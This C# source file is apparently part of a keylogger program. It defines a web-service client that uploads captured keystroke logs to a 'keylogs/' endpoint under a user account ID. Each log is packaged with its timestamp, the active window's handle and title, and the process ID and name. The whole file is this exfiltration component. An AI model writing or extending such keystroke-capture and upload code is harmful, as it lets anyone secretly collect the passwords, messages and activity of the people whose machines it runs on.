using System;
using System.Collections.Generic;
using System.Threading;
using System.Threading.Tasks;
using RestSharp;

namespace Logger.Webservice
{
    using Keyboard;

    partial class Client
    {
        public void SubmitKeylogs(string userAccountID, IEnumerable<Keylog> keylogs)
        {
            Execute(new KeylogSubmitRequest(userAccountID, keylogs));
        }

        public Task SubmitKeylogsAsync(string userAccountID, IEnumerable<Keylog> keylogs, CancellationToken token)
        {
            return ExecuteAsync(new KeylogSubmitRequest(userAccountID, keylogs), token);
        }
    }

    class KeylogSubmitRequest : SubmitRequest<Keylog>
    {
        const string resource = "keylogs/";

        public KeylogSubmitRequest(string userAccountID, IEnumerable<Keylog> keylogs) : base(resource, keylogs)
        {
            this.AddQueryParameter("account_id", userAccountID);
        }

        override protected object ToJSONShape(Keylog keylog)
        {
            return new { log = keylog.Log,
                         datetime = keylog.DateTime,
                         window_handle = keylog.WindowHandle.ToString(),
                         window_title = keylog.WindowTitle,
                         process_id = keylog.ProcessID,
                         process_name = keylog.ProcessName };
        }
    }
}
